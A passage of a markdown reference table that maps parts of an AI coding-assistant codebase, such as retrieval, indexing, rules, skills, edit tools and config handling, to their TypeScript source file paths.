| Retrieval pipeline | `core/context/retrieval/pipelines/` |
| Indexing orchestrator | `core/indexing/CodebaseIndexer.ts` |
| Embeddings index | `core/indexing/LanceDbIndex.ts` |
| FTS index | `core/indexing/FullTextSearchCodebaseIndex.ts` |
| Code snippets index | `core/indexing/CodeSnippetsIndex.ts` |
| Rules system | `core/llm/rules/getSystemMessageWithRules.ts` |
| Skills loader | `core/config/markdown/loadMarkdownSkills.ts` |
| Edit: multi_edit | `core/tools/definitions/multiEdit.ts` |
| Edit: single find/replace | `core/tools/definitions/singleFindAndReplace.ts` |
| Edit: lazy diff | `core/tools/definitions/editFile.ts` |
| Model capability check | `core/llm/toolSupport.ts` |
| LLM base class | `core/llm/index.ts` |
| Config handler | `core/config/ConfigHandler.ts` |
